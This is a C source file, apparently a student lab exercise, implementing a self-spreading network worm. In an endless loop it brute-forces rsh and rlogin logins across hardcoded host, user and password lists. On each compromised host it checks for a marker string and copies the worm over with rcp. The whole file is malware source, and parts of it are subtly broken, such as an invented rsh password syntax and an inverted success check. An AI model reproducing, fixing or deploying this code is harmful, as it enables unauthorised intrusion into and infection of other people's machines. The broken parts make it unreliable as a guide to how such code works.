//
//  testme.c
//  lab2
//
//  Created by Shashadhar Das on 02/02/22.
//

// This text is searched to check if a machine is infected
/*
 2111CS14_MSE_WORM
 2111CS14_MSE_WORM
 2111CS14_MSE_WORM
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define SHELLSCRIPT "\
#/bin/bash \n\
"


void detectWorm(){
    //rsh host ls >> ls.txt, we will store the contents in a file
    char lsCommand[256] = SHELLSCRIPT;
    strcat(lsCommand, " ls >> ls.txt");
    int val = system(lsCommand);
    
    if(val ==0){
        FILE * fp;
        char * line = NULL;
        size_t len = 0;
        ssize_t read;
        
        fp = fopen("ls.txt", "r");
        if (fp == NULL)
            exit(EXIT_FAILURE);
        
        while ((read = getline(&line, &len, fp)) != -1) {
            printf("Retrieved line of length %zu:\n", read);
            printf("%s", line);
            char *ret;
            ret = strstr(line, "2111CS14_MSE_WORM");
            if (ret){
                printf("Worm detected!!");
            }
        }
    }
}


char userNames[20][20] = {"2111cs14", "user1", "user2", "user3", "user4","user5","user6","user7","user8","user9","user10","user11","user12","user13","user14","user15","user16","user17","user18","user19"};

char hostNames[20][20] = {"host1", "host2", "host3", "host4", "host5","host6","host7","host8","host9","host10","host11","host12","host13","host14","host15","host16","host17","host18","host19","host20"};

char passwords[20][20] = {"pass1", "pass2", "pass3", "pass4", "pass5","pass6","pass7","pass8","pass9","pass10","pass11","pass12","pass13","pass14","pass15","pass16","pass17","pass18","pass19","pass20"};


int main(){
    
    // we will try to get new host mames infitely and try to infect them
    while (1) {
        
        int hostNo;
        int passWordNo;
        int userNameNo;
        
        
        /*
         For each host we are trying all the usernames and password combination
         */
        for ( hostNo=0; hostNo<20; hostNo++ ) {
            
            for (passWordNo=0;passWordNo<20;passWordNo++){
                
                for(userNameNo=0;userNameNo<20;userNameNo++){
                    
                    char* userName= userNames[userNameNo];
                    char* password = passwords[passWordNo];
                    char* hostName= hostNames[hostNo];
                    printf("\nTrying password %s for user %s with host:%s",password,userName,hostName);
                    
                    // create the rsh script
                    //"rsh -l username [:password] host_command"
                    
                    char destination[256] = SHELLSCRIPT;
                    strcat(destination, "rsh -l ");
                    strcat(destination,userName);
                    strcat(destination, " [:");
                    strcat(destination, password);
                    strcat(destination, "] ");
                    strcat(destination,hostName);
                    int value = system(destination);
                    // successfully command executed
                    if(value==0){
                        // crate rsh command for login
                        //rlogin -l hope domain.com
                        char loginDestination[256] = SHELLSCRIPT;
                        strcat(loginDestination,"rlogin -l ");
                        strcat(loginDestination,userName);
                        strcat(loginDestination, " ");
                        strcat(loginDestination, hostName);
                        int value = system(loginDestination);
                        
                        // we are successfully login,
                        if(value==0){
                            // run the ls command to get the files and check if it is infected
                            //rsh host ls >> ls.txt, we will store the contents in a file
                            char lsCommand[256] = SHELLSCRIPT;
                            strcat(lsCommand,"rsh ");
                            strcat(lsCommand,hostName);
                            strcat(lsCommand, " ls >> ls.txt");
                            system(lsCommand);
                            
                            // get the file and store in local
                            //rsh host2 cat ls.txt >> lsLocal.txt
                            
                            char lsFileToLocal[256] = SHELLSCRIPT;
                            strcat(lsFileToLocal,"rsh ");
                            strcat(lsFileToLocal,hostName);
                            strcat(lsFileToLocal, "cat ls.txt >> lsLocal.txt");
                            int val = system(lsFileToLocal);
                            if(val ==0){
                                FILE * fp;
                                char * line = NULL;
                                size_t len = 0;
                                ssize_t read;
                                
                                fp = fopen("lsLocal.txt", "r");
                                if (fp == NULL)
                                    exit(EXIT_FAILURE);
                                
                                while ((read = getline(&line, &len, fp)) != -1) {
                                    printf("Retrieved line of length %zu:\n", read);
                                    printf("%s", line);
                                    char *ret;
                                    ret = strstr(line, "2111CS14_MSE_WORM");
                                    if (ret){
                                        printf("Already infected!!");
                                    }else{
                                        // infect the machine
                                        // copy the worm file to the remote system
                                        //rcp document1 host:document1
                                        char copyWormFile[256]= SHELLSCRIPT;
                                        strcat(copyWormFile, "rcp 2111CS14_MSE_WORM ");
                                        strcat(copyWormFile, hostName);
                                        strcat(copyWormFile, ":2111CS14_MSE_WORM");
                                        int val =system(copyWormFile);
                                        if(val){
                                            printf("We have successfully infected the remote machine");
                                        }
                                        
                                    }
                                    
                                }
                                
                                fclose(fp);
                            }
                            
                        }
                        
                    }
                }
                
            }
            
        }
        
    }
}







